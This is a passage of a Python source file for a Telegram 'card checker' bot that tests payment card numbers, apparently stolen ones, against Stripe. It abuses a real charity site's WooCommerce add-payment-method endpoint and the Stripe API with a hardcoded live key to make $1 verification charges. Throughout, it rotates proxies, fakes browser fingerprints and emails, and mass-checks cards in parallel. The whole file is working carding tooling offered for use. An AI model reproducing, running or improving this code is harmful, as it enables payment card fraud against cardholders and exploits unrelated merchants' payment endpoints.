                    error_msg += f" ({decline_code})"
            except:
                error_msg = "Card declined"
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth V2 | Time: {time_taken:.2f}s")
        
        try:
            pm_json = response.json()
            pm_id = pm_json.get("id")
        except:
            raise Exception("Invalid payment method response")
        
        if not pm_id:
            raise Exception("Payment method ID not found")
        
        # Step 5: Confirm setup intent
        final_headers = headers.copy()
        final_headers.update({
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'referer': 'https://steepvillagehall.org.uk/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
        })
        
        final_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = await client.post('https://steepvillagehall.org.uk/wp-admin/admin-ajax.php', headers=final_headers, data=final_data)
        except Exception as e:
            raise Exception(f"Ajax request error: {str(e)}")
        
        if response.status_code == 403:
            raise Exception("Service temporarily unavailable (403)")
        
        if response.status_code != 200:
            raise Exception(f"Service temporarily unavailable ({response.status_code})")
        
        try:
            result_json = response.json()
        except:
            raise Exception("Invalid response format")
        
        time_taken = time.time() - start_time
        
        if result_json.get("success"):
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("approved", card, "Card Approved Successfully! ✅", f"Gateway: Stripe Auth V2 | Time: {time_taken:.2f}s")
        else:
            error_data = result_json.get("data", {})
            error = error_data.get("error", {})
            error_msg = error.get("message", "Payment declined")
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth V2 | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"Stripe Auth V2 check failed: {e}")
        error_msg = clean_error_message(str(e))
        return format_card_result("error", card, error_msg, f"Gateway: Stripe Auth V2 | Time: {time_taken:.2f}s")
    finally:
        # Return client to pool if it exists
        if client:
            await client_pool.return_client(client)

# ==================== SK BASED 1$ CHECKER ====================
async def sk_based_check_card(card: str) -> str:
    """Check card via SK Based 1$ API with Authorization header"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = await proxy_manager.get_working_proxy()
    pk_key = "pk_live_51QuMQyFFXXyXZOvgkBdCd4rvxl6TUW7f8GrF33AiWxQXCcNaHpc8TAjoj5FgoJlBOqOZD6XuBozhBuA6FWZq3Wbi00ATd45WZb"
    client = None
    
    try:
        full_year = f"20{yy}" if len(yy) == 2 else yy
        
        client = await client_pool.get_client(proxy=proxy, timeout=15)
        # Step 1: Create Payment Method using Authorization header with pk_key
        pm_data = {
            "type": "card",
            "billing_details[name]": "John Doe",
            "billing_details[address][city]": "New York",
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": "123 Main St",
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm.zfill(2),
            "card[exp_year]": full_year,
            "guid": str(uuid.uuid4()),
            "muid": str(uuid.uuid4()),
            "sid": str(uuid.uuid4()),
            "payment_user_agent": "stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element",
            "time_on_page": str(random.randint(10021, 10090)),
        }
        
        pm_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {pk_key}",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        
        response = await client.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_data)
        
        text = response.text
        if "Invalid API Key provided" in text or "testmode_charges_only" in text or "api_key_expired" in text:
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, False, time_taken)
            return format_card_result("error", card, "API key expired or invalid", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        if response.status_code != 200:
            try:
                pm_json = response.json()
                error_msg = pm_json.get("error", {}).get("message", "Payment method creation failed")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
            except:
                error_msg = "Payment method creation failed"
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        try:
            pm_json = response.json()
            payment_method_id = pm_json["id"]
        except:
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, False, time_taken)
            return format_card_result("error", card, "Unexpected response (no ID)", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        # Step 2: Create Payment Intent using sk_live
        pi_data = {
            "amount": 100,
            "currency": "usd",
            "payment_method_types[]": "card",
            "payment_method": payment_method_id,
            "confirm": "true",
            "off_session": "true",
            "use_stripe_sdk": "true",
            "description": "Card verification",
            "receipt_email": generate_fake_email(),
            "metadata[order_id]": str(random.randint(100000000000000000, 999999999999999999)),
        }
        
        pi_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {STRIPE_API_KEY}",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        
        response = await client.post("https://api.stripe.com/v1/payment_intents", headers=pi_headers, data=pi_data)
        text = response.text
        
        time_taken = time.time() - start_time
        
        try:
            json_res = response.json()
            
            if "requires_action" in text or "requires_source_action" in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, "3D Secure Required", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("approved", card, "CVV Live ✅", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            if "error" in text:
                if "decline_code" in json_res.get("error", {}):
                    msg = json_res["error"]["decline_code"].replace("_", " ").title()
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, msg, f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
                else:
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, json_res["error"]["message"], f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            elif "succeeded" in text or json_res.get("status") == "succeeded" or "success:true" in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("approved", card, "Charged 🔥", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            else:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("error", card, "Unexpected response", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        except:
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("error", card, "Unexpected response", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"SK Based 1$ check failed: {e}")
        return format_card_result("error", card, clean_error_message(str(e)), f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
    finally:
        # Return client to pool if it exists
        if client:
            await client_pool.return_client(client)

# ==================== COMMAND HANDLERS ====================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    """Start command"""
    welcome_msg = (
        "🚀 <b>Welcome to Trinp Checker Bot!</b>\n━━━━━━━━━━━━━━━\n\n"
        "<b>🔥 Stripe Auth Gateway:</b>\n"
        "• <code>/chk CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mass</code> - Mass check\n\n"
        "<b>🔥 Stripe Auth V2:</b>\n"
        "• <code>/chk2 CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mass2</code> - Mass check\n\n"
        "<b>⚡ SK Based 1$ (ADVANCED):</b>\n"
        "• <code>/st CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mst</code> - Mass check\n\n"
        "<b>🔍 BIN Lookup:</b>\n"
        "• <code>/bin 453211</code> - Check BIN information\n\n"
        "━━━━━━━━━━━━━━━\n"
        "💡 Use <code>/cmds</code> for detailed help\n"
        "📊 Use <code>/status</code> for advanced statistics"
    )
    await message.answer(welcome_msg, parse_mode='HTML')

@dp.message(Command("cmds"))
async def cmd_cmds(message: Message):
    """Detailed commands help"""
    help_text = """
🚀 <b>ADVANCED Card Checker Bot - Commands</b>
━━━━━━━━━━━━━━━

<b>🔍 Single Card Checks:</b>
• <code>/chk 4532111111111111|12|25|123</code>
  └ Stripe Auth Gateway (single check)
• <code>/chk2 4532111111111111|12|25|123</code>
  └ Stripe Auth V2 (single check)
• <code>/st 4532111111111111|12|25|123</code>
  └ SK Based 1$ (single check)

<b>📦 ADVANCED Mass Card Checks:</b>
• <code>/mass</code>
  └ Stripe Auth Gateway (up to 20 cards, 50 concurrent)
• <code>/mass2</code>
  └ Stripe Auth V2 (up to 20 cards, 50 concurrent)
• <code>/mst</code>
  └ SK Based 1$ (up to 20 cards, 50 concurrent)

<b>🔍 BIN Lookup:</b>
• <code>/bin 453211</code>
  └ Check BIN information (first 6 digits)

<b>📋 Supported Card Formats:</b>
• <code>4532111111111111|12|25|123</code>
• <code>4532111111111111/12/25/123</code>
• <code>4532111111111111 12 25 123</code>
• <code>4532111111111111-12-25-123</code>

<b>⏱️ Rate Limits:</b>
• Single checks: 5 second cooldown
• Mass checks: 20 second cooldown
• Max cards per mass check: 20 (ADVANCED)

<b>🌐 Available Gateways:</b>
• <b>Stripe Auth:</b> Advanced authentication gateway
• <b>Stripe Auth V2:</b> Secondary authentication gateway
• <b>SK Based 1$:</b> Real $1 charge verification

<b>🔧 Utility Commands:</b>
• <code>/status</code> - Bot status and statistics

━━━━━━━━━━━━━━━
⚡ <b>Fast • Reliable • Secure</b>
    """
    await message.answer(help_text, parse_mode='HTML')
@dp.message(Command("status"))
async def cmd_status(message: Message):
    """Show ADVANCED bot status with detailed statistics"""
    working_proxies = len(proxy_manager.working_proxies)
    total_proxies = len(proxy_manager.proxies)
    
    # Get advanced statistics
    pool_stats = client_pool.get_stats()
    processor_stats = parallel_processor.get_stats()
    card_stats = card_processor.get_stats()
    
    # Calculate proxy success rate
    total_stats = sum(proxy_manager.proxy_stats.values(), {"success": 0, "fail": 0})
    total_requests = total_stats["success"] + total_stats["fail"]
    proxy_success_rate = (total_stats["success"] / max(total_requests, 1)) * 100
    
    status_text = f"""
🤖 <b>Bot Status</b>
━━━━━━━━━━━━━━━
<b>Status:</b> ✅ Online
<b>Current Time:</b> {datetime.now().strftime('%H:%M:%S')}

<b>🚀 Gateways:</b>
• Stripe Auth: ✅ Active
• Stripe Auth V2: ✅ Active
• SK Based 1$: ✅ Active

━━━━━━━━━━━━━━━
⚡ <b>All Systems Operational</b>
    """
    await message.answer(status_text, parse_mode='HTML')

@dp.message(Command("bin"))
async def cmd_bin(message: Message):
    """BIN lookup command"""
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/bin 453211</code>\n\n"
            "<b>Example:</b> <code>/bin 453211</code>\n\n"
            "<b>Info:</b> Check BIN information (first 6 digits)",
            parse_mode='HTML'
        )
        return
    
    bin_input = command_parts[1].strip()
    
    # Validate BIN format
    if not bin_input.isdigit() or len(bin_input) < 4 or len(bin_input) > 6:
        await message.answer("❌ Invalid BIN format. Use 4-6 digits", parse_mode='HTML')
        return
    
    # Get BIN information
    bin_info = bin_db.get_bin_info(bin_input)
    
    if bin_info:
        bin_display = bin_db.format_bin_info(bin_info)
        result = f"🔍 <b>BIN Lookup Result</b>\n━━━━━━━━━━━━━━━\n<code>{bin_input}</code>\n━━━━━━━━━━━━━━━\n{bin_display}\n━━━━━━━━━━━━━━━"
    else:
        result = f"🔍 <b>BIN Lookup Result</b>\n━━━━━━━━━━━━━━━\n<code>{bin_input}</code>\n━━━━━━━━━━━━━━━\n╟ 𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: Unknown\n╟ 𝗕𝗮𝗻𝗸: Unknown\n╟ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown\n━━━━━━━━━━━━━━━"
    
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("chk"))
async def cmd_chk(message: Message):
    """Stripe Auth Gateway single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/chk CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/chk 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> Stripe Auth",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>Stripe Auth Gateway checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await stripe_auth_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("chk2"))
async def cmd_chk2(message: Message):
    """Stripe Auth V2 single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/chk2 CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/chk2 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> Stripe Auth V2",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>Stripe Auth V2 checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await stripe_auth_check_card_v2(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mass"))
async def cmd_mass(message: Message):
    """Stripe Auth Gateway mass check with ADVANCED parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mass\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> Stripe Auth\n"
            "<b>Mode:</b> 🚀Parallel Processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # Increased limit for advanced processing
    if len(cards_to_check) > 20:
        cards_to_check = cards_to_check[:20]
        await message.answer("⚠️ Limited to 20 cards for processing", parse_mode='HTML')
    
    total_cards = len(cards_to_check)
    
    progress_msg = await message.answer(
        f"🚀 <b>Processing</b> {total_cards} cards via Stripe Auth Gateway...\n",
        parse_mode='HTML'
    )
    
    # Process with advanced parallel system
    start_time = time.time()
    results = await card_processor.process_cards_parallel(
        cards_to_check, 
        stripe_auth_check_card, 
        max_concurrent=50
    )
    total_time = time.time() - start_time
    
    # Send results with advanced progress
    for idx, result in enumerate(results, 1):
        await show_progress(progress_msg, idx, total_cards, "Stripe Auth")
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    # Get advanced statistics
    pool_stats = client_pool.get_stats()
    processor_stats = parallel_processor.get_stats()
    
    await message.answer(
        f"✅ <b>Processing Complete!</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📊 <b>Cards:</b> {total_cards} processed\n"
        f"⏱️ <b>Time:</b> {total_time:.2f}s\n"
        f"⚡ <b>Speed:</b> {total_cards/total_time:.1f} cards/sec\n"
        f"📈 <b>Success Rate:</b> {processor_stats['success_rate']:.1f}%\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Maximum Performance Achieved!</b>",
        parse_mode='HTML'
    )

@dp.message(Command("mass2"))
async def cmd_mass2(message: Message):
    """Stripe Auth V2 mass check with ADVANCED parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mass2\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> Stripe Auth V2\n"
            "<b>Mode:</b> 🚀Parallel Processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # Increased limit for advanced processing
    if len(cards_to_check) > 20:
        cards_to_check = cards_to_check[:20]
        await message.answer("⚠️ Limited to 20 cards for processing", parse_mode='HTML')
    
    total_cards = len(cards_to_check)
    
    progress_msg = await message.answer(
        f"🚀 <b>Processing</b> {total_cards} cards via Stripe Auth V2...\n"
        f"🔗 <b>Connection Pool:</b> 200 clients\n"
        f"📊 <b>Mode:</b> Maximum Performance",
        parse_mode='HTML'
    )
    
    # Process with advanced parallel system
    start_time = time.time()
    results = await card_processor.process_cards_parallel(
        cards_to_check, 
        stripe_auth_check_card_v2, 
        max_concurrent=50
    )
    total_time = time.time() - start_time
    
    # Send results with advanced progress
    for idx, result in enumerate(results, 1):
        await show_progress(progress_msg, idx, total_cards, "Stripe Auth V2")
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    # Get advanced statistics
    pool_stats = client_pool.get_stats()
    processor_stats = parallel_processor.get_stats()
    
    await message.answer(
        f"✅ <b>Processing Complete!</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📊 <b>Cards:</b> {total_cards} processed\n"
        f"⏱️ <b>Time:</b> {total_time:.2f}s\n"
        f"⚡ <b>Speed:</b> {total_cards/total_time:.1f} cards/sec\n"
        f"🔗 <b>Connections:</b> {pool_stats['active_connections']} active\n"
        f"♻️ <b>Reuses:</b> {pool_stats['connection_reuses']}\n"
        f"📈 <b>Success Rate:</b> {processor_stats['success_rate']:.1f}%\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Maximum Performance Achieved!</b>",
        parse_mode='HTML'
    )

@dp.message(Command("st"))
async def cmd_st(message: Message):
    """SK Based 1$ single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/st CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/st 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> SK Based 1$",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>SK Based 1$ checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await sk_based_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mst"))
async def cmd_mst(message: Message):
    """SK Based 1$ mass check with ADVANCED parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mst\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> SK Based 1$\n"
            "<b>Mode:</b> 🚀 Parallel Processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # Increased limit for advanced processing
    if len(cards_to_check) > 20:
        cards_to_check = cards_to_check[:20]
        await message.answer("⚠️ Limited to 20 cards for processing", parse_mode='HTML')
    
    total_cards = len(cards_to_check)
    
    progress_msg = await message.answer(
        f"🚀 <b>Processing</b> {total_cards} cards via SK Based 1$...\n"
        f"⚡ <b>Max Concurrent:</b> 50 tasks\n"
        f"🔗 <b>Connection Pool:</b> 200 clients\n"
        f"📊 <b>Mode:</b> Maximum Performance",
        parse_mode='HTML'
    )
    
    # Process with advanced parallel system
    start_time = time.time()
    results = await card_processor.process_cards_parallel(
        cards_to_check, 
        sk_based_check_card, 
        max_concurrent=100
    )
    total_time = time.time() - start_time
    
    # Send results with advanced progress
    for idx, result in enumerate(results, 1):
        await show_progress(progress_msg, idx, total_cards, "SK Based 1$")
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    # Get advanced statistics
    pool_stats = client_pool.get_stats()
    processor_stats = parallel_processor.get_stats()
    
    await message.answer(
        f"✅ <b>Processing Complete!</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📊 <b>Cards:</b> {total_cards} processed\n"
        f"⏱️ <b>Time:</b> {total_time:.2f}s\n"
        f"⚡ <b>Speed:</b> {total_cards/total_time:.1f} cards/sec\n"
        f"📈 <b>Success Rate:</b> {processor_stats['success_rate']:.1f}%\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Maximum Performance Achieved!</b>",
        parse_mode='HTML'
    )

# ==================== MAIN ====================
async def main():
    """Main function to start bot"""
    logger.info("🤖 Bot starting...")
    
    # Initialize proxies in parallel
    await proxy_manager.initialize()
    
    logger.info("✅ Bot started successfully!")
    try:
        await dp.start_polling(bot)
    finally:
        # Close all HTTP clients
        await client_pool.close_all()
        logger.info("🔌 HTTP clients closed")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")
    except Exception as e:
        logger.error(f"Critical error: {e}")
